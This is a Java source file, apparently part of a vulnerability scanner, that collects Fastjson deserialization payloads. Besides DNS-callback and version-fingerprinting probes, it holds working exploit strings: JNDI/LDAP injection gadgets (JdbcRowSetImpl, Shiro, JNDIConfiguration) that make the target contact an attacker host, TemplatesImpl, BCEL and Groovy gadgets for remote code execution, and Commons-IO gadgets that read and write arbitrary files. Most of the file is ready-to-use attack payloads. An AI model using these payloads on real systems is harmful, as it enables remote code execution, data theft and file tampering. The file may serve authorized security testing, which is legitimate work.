package com.scanner.vuln;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class FastjsonPayloads {

    private static final Pattern JSON_KEY_VALUE = Pattern.compile("\"([^\"]+)\"\\s*:", Pattern.MULTILINE);
    private static final Pattern JSON_VALUE_STRING = Pattern.compile("\"([^\"]+)\"\\s*}", Pattern.MULTILINE);

    public static class Detection {
        public static final String DNSLOG_PAYLOAD = "{\"@type\":\"java.net.Inet4Address\",\"val\":\"%s\"}";

        public static final String DNSLOG_PAYLOAD_V2 = "{\"[{\\\"@type\\\":\\\"java.net.URL\\\",\\\"val\\\":\\\"http://%s\\\"}:\\\"x\"]";

        public static final String AUTO_CLOSEABLE_VERSION = "{\"@type\":\"java.lang.AutoCloseable\"}";

        public static final String TYPE_CHECK = "{\"@type\":\"whatever\"}";

        public static final String FASTJSON_FINGERPRINT_1 = "{\"@type\":\"java.lang.AutoCloseable\"}";
        public static final String FASTJSON_FINGERPRINT_2 = "fastjson";

        public static List<String> getDnsPayloads(String dnsHost) {
            return Arrays.asList(
                    String.format("{\"@type\":\"java.net.Inet4Address\",\"val\":\"%s\"}", dnsHost),
                    String.format("{\"[{\\\"@type\\\":\\\"java.net.URL\\\",\\\"val\\\":\\\"http://%s\\\"}:\\\"x\"]}", dnsHost),
                    String.format("{\"@type\":\"java.net.Socket\",\"val\":\"%s\"}", dnsHost)
            );
        }

        public static List<String> getVersionDetectionPayloads() {
            return Arrays.asList(
                    "{\"@type\":\"java.lang.AutoCloseable\"}",
                    "{\"@type\":\"java.lang.Class\",\"val\":\"java.io.ByteArrayOutputStream\"}",
                    "{\"@type\":\"com.alibaba.fastjson.JSONObject\"}"
            );
        }

        public static List<String> getSyntaxErrorPayloads() {
            return Arrays.asList(
                    "{\"name\":\"hello\", \"age\":2",
                    "{\"name\":\"hello\", \"age\":2}",
                    "{\"name\"\":\"hello\", \"age\":2}"
            );
        }

        public static List<String> getDynamicSyntaxErrorPayloads(String originalBody) {
            List<String> payloads = new ArrayList<>();

            if (originalBody == null || originalBody.trim().isEmpty()) {
                return getSyntaxErrorPayloads();
            }

            payloads.add(originalBody.substring(0, Math.max(1, originalBody.length() / 2)));

            Matcher keyMatcher = JSON_KEY_VALUE.matcher(originalBody);
            if (keyMatcher.find()) {
                String firstKey = keyMatcher.group(1);
                payloads.add("{\"" + firstKey + "\":}");
                payloads.add("{\"" + firstKey + "\":\"}");
                payloads.add("{\"" + firstKey + "\":}");
            }

            Matcher valueMatcher = JSON_VALUE_STRING.matcher(originalBody);
            if (valueMatcher.find()) {
                String lastValue = valueMatcher.group(1);
                payloads.add("{" + lastValue);
            }

            payloads.add(originalBody + "\"");
            payloads.add(originalBody.replace("}", "\""));

            return payloads;
        }

        public static List<String> getMultiVersionDnsPayloads(String dnsHost) {
            return Arrays.asList(
                    String.format("[{\"@type\":\"java.lang.Class\",\"val\":\"java.io.ByteArrayOutputStream\"},{\"@type\":\"java.io.ByteArrayOutputStream\"},{\"@type\":\"java.net.InetSocketAddress\":{\"address\":,\"val\":\"%s\"}}]", dnsHost),
                    String.format("[{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"java.io.ByteArrayOutputStream\"},{\"@type\":\"java.io.ByteArrayOutputStream\"},{\"@type\":\"java.net.InetSocketAddress\":{\"address\":,\"val\":\"%s\"}}]", dnsHost),
                    String.format("[{\"@type\":\"java.lang.Exception\",\"@type\":\"com.alibaba.fastjson.JSONException\",\"x\":{\"@type\":\"java.net.InetSocketAddress\":{\"address\":,\"val\":\"%s\"}}},{\"@type\":\"java.lang.Exception\",\"@type\":\"com.alibaba.fastjson.JSONException\",\"message\":{\"@type\":\"java.net.InetSocketAddress\":{\"address\":,\"val\":\"%s\"}}}]", dnsHost, dnsHost)
            );
        }

        public static List<String> getVersionBypassPayloads() {
            return Arrays.asList(
                    "{\"@type\":\"java.lang.Class\",\"val\":\"java.io.ByteArrayOutputStream\"}",
                    "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"java.io.ByteArrayOutputStream\"}",
                    "{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"@type\":\"java.lang.AutoCloseable\"}"
            );
        }

        public static List<String> getAutoCloseablePayloads() {
            return Arrays.asList(
                    "{\"@type\":\"java.lang.AutoCloseable\"}",
                    "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"java.io.ByteArrayOutputStream\"}"
            );
        }
    }

    public static class Exploit {
        public static final String JdbcRowSetImpl_1247 = "{" +
                "\"a\":{" +
                "\"@type\":\"java.lang.Class\"," +
                "\"val\":\"com.sun.rowset.JdbcRowSetImpl\"" +
                "}," +
                "\"b\":{" +
                "\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
                "\"dataSourceName\":\"ldap://%s/Exploit\"," +
                "\"autoCommit\":true" +
                "}" +
                "}";

        public static final String JdbcRowSetImpl_Basic = "{" +
                "\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
                "\"dataSourceName\":\"ldap://%s/Exploit\"," +
                "\"autoCommit\":true" +
                "}";

        public static final String AutoCloseable_Basic = "{\"@type\":\"java.lang.AutoCloseable\"}";

        public static final String Inet4Address_DNS = "{" +
                "\"@type\":\"java.net.Inet4Address\"," +
                "\"val\":\"%s\"" +
                "}";

        public static final String URL_DNS = "{" +
                "\"[{\\\"@type\\\":\\\"java.net.URL\\\",\\\"val\\\":\\\"http://%s\\\"}:\\\"x\"]" +
                "}";

        public static final String Class_Cache = "{" +
                "\"@type\":\"java.lang.Class\"," +
                "\"val\":\"com.sun.rowset.JdbcRowSetImpl\"" +
                "}";

        public static final String C3P0_1247 = "{" +
                "\"a\":{" +
                "\"@type\":\"java.lang.Class\"," +
                "\"val\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"" +
                "}," +
                "\"b\":{" +
                "\"@type\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"," +
                "\"userOverridesAsString\":\"HexAsciiSerializedMap:EVIL_HEX;\"" +
                "}" +
                "}";

        public static final String CommonsIO_ReadFile = "{" +
                "\"abc\":{" +
                "\"@type\":\"java.lang.AutoCloseable\"," +
                "\"@type\":\"org.apache.commons.io.input.BOMInputStream\"," +
                "\"delegate\":{" +
                "\"@type\":\"org.apache.commons.io.input.ReaderInputStream\"," +
                "\"reader\":{" +
                "\"@type\":\"jdk.nashorn.api.scripting.URLReader\"," +
                "\"url\":\"file://%s\"" +
                "}," +
                "\"charsetName\":\"UTF-8\"," +
                "\"bufferSize\":1024" +
                "}," +
                "\"boms\":[{\"@type\":\"org.apache.commons.io.ByteOrderMark\",\"charsetName\":\"UTF-8\",\"bytes\":[70,76]}]" +
                "}" +
                "}";

        public static final String Shiro_AutoType = "{" +
                "\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\"," +
                "\"resourceName\":\"ldap://%s/Exploit\"," +
                "\"instance\":{\"$ref\":\"$.instance\"}" +
                "}";

        public static final String JNDI_Configuration_1260 = "{" +
                "\"@type\":\"org.apache.commons.configuration.JNDIConfiguration\"," +
                "\"prefix\":\"ldap://%s/msy62c\"" +
                "}";

        public static final String JNDI_Configuration2_1261 = "{" +
                "\"@type\":\"org.apache.commons.configuration2.JNDIConfiguration\"," +
                "\"prefix\":\"ldap://%s/msy62c\"" +
                "}";

        public static final String CommonsIO_WriteFile_JDK8 = "{" +
                "\"stream\":{" +
                "\"@type\":\"java.lang.AutoCloseable\"," +
                "\"@type\":\"org.eclipse.core.internal.localstore.SafeFileOutputStream\"," +
                "\"targetPath\":\"%s\"," +
                "\"tempPath\":\"%s\"" +
                "}," +
                "\"writer\":{" +
                "\"@type\":\"java.lang.AutoCloseable\"," +
                "\"@type\":\"com.esotericsoftware.kryo.io.Output\"," +
                "\"buffer\":\"cXdlcmFzZGY=\"," +
                "\"outputStream\":{\"$ref\":\"$.stream\"}," +
                "\"position\":8" +
                "}," +
                "\"close\":{" +
                "\"@type\":\"java.lang.AutoCloseable\"," +
                "\"@type\":\"com.sleepycat.bind.serial.SerialOutput\"," +
                "\"out\":{\"$ref\":\"$.writer\"}" +
                "}" +
                "}";

        public static final String CommonsIO_WriteFile_26 = "{" +
                "\"x\":{" +
                "\"@type\":\"com.alibaba.fastjson.JSONObject\"," +
                "\"input\":{" +
                "\"@type\":\"java.lang.AutoCloseable\"," +
                "\"@type\":\"org.apache.commons.io.input.ReaderInputStream\"," +
                "\"reader\":{" +
                "\"@type\":\"org.apache.commons.io.input.CharSequenceReader\"," +
                "\"charSequence\":{\"@type\":\"java.lang.String\"\":\"%s\"" +
                "}," +
                "\"charsetName\":\"UTF-8\"," +
                "\"bufferSize\":1024" +
                "}," +
                "\"branch\":{" +
                "\"@type\":\"java.lang.AutoCloseable\"," +
                "\"@type\":\"org.apache.commons.io.output.WriterOutputStream\"," +
                "\"writer\":{" +
                "\"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\"," +
                "\"file\":\"%s\"," +
                "\"encoding\":\"UTF-8\"," +
                "\"append\":false" +
                "}," +
                "\"charsetName\":\"UTF-8\"," +
                "\"bufferSize\":1024," +
                "\"writeImmediately\":true" +
                "}" +
                "}" +
                "}";
    }

    public static class RCE_Payloads {
        public static final String TemplatesImpl_124 = "{" +
                "\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"," +
                "\"_bytecodes\":[\"%s\"]," +
                "\"_name\":\"lemono\"," +
                "\"_tfactory\":{}," +
                "\"_outputProperties\":{}" +
                "}";

        public static final String BCEL_1247 = "{" +
                "\"x\":{" +
                "\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\"," +
                "\"driverClassLoader\":{" +
                "\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"" +
                "}," +
                "\"driverClassName\":\"$$BCEL$$%s\"" +
                "}" +
                "}:\"x\"";

        public static final String Groovy_1280_Part1 = "{" +
                "\"@type\":\"java.lang.Exception\"," +
                "\"@type\":\"org.codehaus.groovy.control.CompilationFailedException\"," +
                "\"unit\":{}" +
                "}";

        public static final String Groovy_1280_Part2 = "{" +
                "\"@type\":\"org.codehaus.groovy.control.ProcessingUnit\"," +
                "\"@type\":\"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\"," +
                "\"config\":{" +
                "\"@type\":\"org.codehaus.groovy.control.CompilerConfiguration\"," +
                "\"classpathList\":\"http://%s/\"" +
                "}" +
                "}";

        public static final String C3P0_Serial = "{" +
                "\"a\":{" +
                "\"@type\":\"java.lang.Class\"," +
                "\"val\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"" +
                "}," +
                "\"b\":{" +
                "\"@type\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"," +
                "\"userOverridesAsString\":\"HexAsciiSerializedMap:%s;\"" +
                "}" +
                "}";

        public static final String Shiro_1252 = "{" +
                "\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\"," +
                "\"resourceName\":\"ldap://%s/Exploit\"," +
                "\"instance\":{\"$ref\":\"$.instance\"}" +
                "}";
    }
}